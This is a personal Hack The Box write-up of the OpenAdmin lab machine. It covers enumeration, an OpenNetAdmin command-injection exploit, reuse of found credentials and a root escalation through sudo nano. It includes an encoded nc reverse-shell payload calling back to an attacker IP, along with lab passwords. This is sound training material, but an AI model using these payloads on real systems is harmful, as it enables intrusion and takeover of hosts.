# <span style="color:#f8b7f8">Machine #14 OpenAdmin</span>  


## <span style="color:#f8b7f8">Notes During Working on the Machine 🧐🤓   

* In this path `http://10.129.170.143/artwork/` found a website.
* I will try and gobuster the previous path see what I get.
* The root opens the default page for Apache.  
* In the website I found "Arcwork" I found a form that when the button is pressed in it it sends a post request but without the input which I think means it's as useful as a bag of chips to break the website.  
* The form in `/sierra` sends parameters in the post which means it might be exploitable in a way MAYBE. In this path `/sierra/contact_process.php` the post takes place.  
* Emails I found  
  * contact@sierracompany.com (In the sierra website).
  * hello@mydomain.com (Arcwork website).  
* In the last website `/music` I found something interesting when I pressed "login" it opened this url `http://10.129.170.143/ona/` which opened something weird called openNetAdmin which seems like it's obviously key to solving the machine.
* Found a dns domain. I'm gonna try and put it in hosts.
* OpenNetAdmin version ==> OpenNetAdmin - v18.1.1.
* I was able to login as "admin/admin" in the opennetadmin.
* It seems that the exploit I found for this version of openNetAdmin takes advantage of the "IP Calculator".  
* Exploit's payload  
  ```console
  xajax=window_submit&xajaxr=1643382750871&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.74%204444%20%3E%2Ftmp%2Ff&xajaxargs[]=ping%22%20%22http%3A%2F%2F10.129.170.143%2Fona%2F  
  ```

* Found a credential for the database 
  ```console
   'db_type' => 'mysqli',
          'db_host' => 'localhost',
          'db_login' => 'ona_sys',
          'db_passwd' => 'n1nj4W4rri0R!', // turns out this is jimmy's password
          'db_database' => 'ona_default',
          'db_debug' => false,
  ```

* Found another password for jimmy `Revealed` it was hashed with sha 512 and I was able to crack it easily anyway what do I need it for?  

* `/etc/sudoers.d/joanna:joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv`  


  ```
  lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf                                                 
      ServerName internal.openadmin.htb
  lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf                                               
          ServerName openadmin.htb
  ```  

* I was able to get joanna's key by executing this 
  ```console
  curl -X POST -F 'username=jimmy' -F 'password=Revealed' -F 'login=' http://localhost:52846/main.php
  ```
But I'm not able to use the passphrase yettt which is frustrating and a reverse shell is not working.

<br/><br/>



## <span style="color:#f8b7f8">How Did I Solve the Machine 😎🥳 

1. After enumerating the machine I found a webpage that is an ona with a vulnerable version to an exploit that was easily implemented so I didn it and got www-data.
2. Then I got jimmy with more enumeration when I found this password in some file written in plain text.
3. This left me with trying to priv esc to joanna (horizontally).
4. I found an internal webserver on a weird port and realizing that joanna was the one executing it I manipulated the ssh files instead of brute forcing the passphrase for her own private key and got her.
5. After that there was an easy way of getting a rev shell with root when nano is executed with sudo.   

## <span style="color:#f8b7f8">Where I Got Stuck?😡😧  
* When I was trying to priv esc to joanna.
* It took me time to find the internal web server.
* And when I found it I kept trying to spawn a reverse shell but it didn't work. Still dunno why.

## <span style="color:#f8b7f8">What Did I learn from this Machine?👀  

* OpenNetAdmin  
  <blockquote>
  OpenNetAdmin is a Network Management application that provides a database of managed inventory of IPs, subnets, and hosts in a network with a centralized AJAX web interface. The application is an Opensource written in PHP; you can view the source code on GitHub “ONA Project.”
  </blockquote>

  ### <span style="color:#f8b7f8">Old Software  
  * The ona version was old and it was the specific version that had that specific easy exploit. Even if it did not have a specific exploit software should always be kept up-to-date.  

  ### <span style="color:#f8b7f8">Sudo nano (or any text editor, really)  
  * The ability to sudo a text editor shouldn't be taken easily because as we saw in the machine you just write a few characters into `nano` and then BOOM you get root.  

  ### <span style="color:#f8b7f8">Bad Privileges on files  
  * Which I think falls under file misconfiguration in our case was the ability to edit the files of the internal web server that allowed me to run any command I wanted as joanna and consequently escalating my privilege to her which led me to escalate my privilege to root.  


## <span style="color:#f8b7f8">Writeups ✍🏽📓   

### <span style="color:#f8b7f8">ippsec  

* So first he tried to look for a "robot.txt" file because it could lead to something if it existed.
* He tried to check if the backend was php by trying "index.php" if "index.html" existed.
* Looked at the source code of the websites he found to see if he can find the software that is used to make the website.
* He checked the source of the page to check what is the type of the content management system that is being used.  
* Carousel is a popular wordpress plugin.  
* He made an HTML page with `python -m http.server 80` to run the exploit that is expecting us to "make an html page".  
* Don't jump straight into a dangerous command with command injection, try a simple, useless one first.  
* We can test for a firewall if we `nc [MY IP] [PORT]` we can check if a firewall is blocking us.   

### <span style="color:#f8b7f8">0xdf's Writeup  

* He used a webshell and then made a rev shell.

<!-- @nested-tags:old_software/machines/openadmin,file_misconfiguration/machines/openadmin-->